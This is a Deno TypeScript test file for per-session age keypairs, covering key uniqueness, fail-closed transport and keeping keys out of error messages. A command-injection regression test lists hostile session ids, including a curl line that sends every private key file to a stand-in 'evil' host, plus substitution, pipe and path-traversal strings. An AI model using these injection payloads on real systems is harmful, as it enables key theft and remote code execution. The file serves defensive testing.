/**
 * Per-session age keypairs.
 *
 * These tests pin two things that are easy to regress and expensive to notice:
 * that every session really does get its own key (a cached or module-level
 * keypair would silently make the whole scheme pointless), and that a transport
 * failure never carries key material into an error message.
 */

import { assert, assertEquals, assertRejects } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { armor, Decrypter } from '@age/age-encryption';
import { ageEncryptTo } from '../lib/age-encrypt.ts';
import { generateSessionKeypair, pushIdentity } from '../lib/session-keys.ts';

Deno.test('generateSessionKeypair - keypair is usable and unique per call', async () => {
  const a = await generateSessionKeypair();
  const b = await generateSessionKeypair();

  assert(a.identity.startsWith('AGE-SECRET-KEY-'));
  assert(a.recipient.startsWith('age1'));
  assert(a.identity !== b.identity, 'each session must get its own key');

  const armored = await ageEncryptTo('answer', [a.recipient]);
  const d = new Decrypter();
  d.addIdentity(a.identity);
  assertEquals(await d.decrypt(armor.decode(armored), 'text'), 'answer');
});

// Real session ids are gate tokens from crypto.randomUUID(); the tests use one
// so they exercise the same validation path production does.
const SESSION = '11111111-2222-3333-4444-555555555555';

Deno.test('pushIdentity - hands the identity to the transport', async () => {
  const seen: Array<{ id: string; key: string }> = [];
  await pushIdentity(SESSION, 'AGE-SECRET-KEY-TEST', (id, key) => {
    seen.push({ id, key });
    return Promise.resolve();
  });
  assertEquals(seen, [{ id: SESSION, key: 'AGE-SECRET-KEY-TEST' }]);
});

Deno.test('pushIdentity - a failing transport propagates (fails closed)', async () => {
  await assertRejects(
    () => pushIdentity(SESSION, 'AGE-SECRET-KEY-TEST', () => Promise.reject(new Error('mesh down'))),
    Error,
  );
});

Deno.test('pushIdentity - transport failure message carries no key material', async () => {
  const err = await pushIdentity(SESSION, 'AGE-SECRET-KEY-LEAKME', () => Promise.reject(new Error('boom')))
    .then(() => null, (e: Error) => e);
  assert(err !== null);
  assert(!err.message.includes('LEAKME'), 'key material must never reach an error message');
});

/**
 * Command-injection regression.
 *
 * The default transport interpolates the session id into a command that a
 * REMOTE SHELL runs, so a hostile id is remote code execution on the box that
 * holds every respondent's private key. These ids must be refused before any
 * transport is invoked -- note the assertions check the transport never ran,
 * not merely that the call rejected.
 */
Deno.test('pushIdentity - refuses shell metacharacters in the session id', async () => {
  const hostile = [
    'x; curl http://evil/$(cat /var/lib/romania/keys/*.key|base64 -w0); #', // exfiltrate every key
    'a$(id)b', // command substitution
    'a`id`b', // backtick substitution
    'a|id', // pipe
    "a'b", // quote break-out
    '../../etc/cron.d/x', // path traversal
    'a\nid', // newline as command separator
  ];

  for (const id of hostile) {
    let transportRan = false;
    await assertRejects(
      () =>
        pushIdentity(id, 'AGE-SECRET-KEY-TEST', () => {
          transportRan = true;
          return Promise.resolve();
        }),
      Error,
      'invalid session id',
    );
    assert(!transportRan, `transport must never run for a hostile id: ${JSON.stringify(id)}`);
  }
});

Deno.test('pushIdentity - accepts a real gate token', async () => {
  let ran = false;
  await pushIdentity(SESSION, 'AGE-SECRET-KEY-TEST', () => {
    ran = true;
    return Promise.resolve();
  });
  assert(ran, 'a legitimate UUID gate token must still be accepted');
});
